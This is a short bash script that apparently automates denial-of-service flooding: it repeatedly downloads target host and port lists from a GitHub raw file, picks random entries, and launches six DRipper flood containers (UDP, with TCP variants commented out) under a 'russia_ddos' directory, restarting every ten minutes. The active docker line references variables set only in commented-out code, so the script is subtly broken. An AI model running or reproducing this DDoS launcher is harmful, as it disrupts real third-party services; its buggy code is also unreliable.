#!/bin/bash
while true
do
for i in $(seq 1 6)
do
#        site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/ddr_udp | cat | shuf -n 1)
#        addr=$(echo $site | awk '{print $1}')
#        port=$(echo $site | awk '{print $2}')
#        echo $site
#        echo $addr
#        echo $port
#        python3 -u ~/russia_ddos/DRipper.py -s $addr -p $port -m udp -t 50&
        site2=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/cur_tcp | cat | shuf -n 1)
        addr2=$(echo $site2 | awk '{print $1}')
        port2=$(echo $site2 | awk '{print $2}')
        echo $site2
        echo $addr2
        echo $port2
#        python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr2 -p $port2 -m tcp -t 50&
        docker run -t --rm alexmon1989/dripper:latest -s $addr -m udp -p $port -t 50&
done
sleep 600
pkill -9 docker
#pkill -9 python3
done
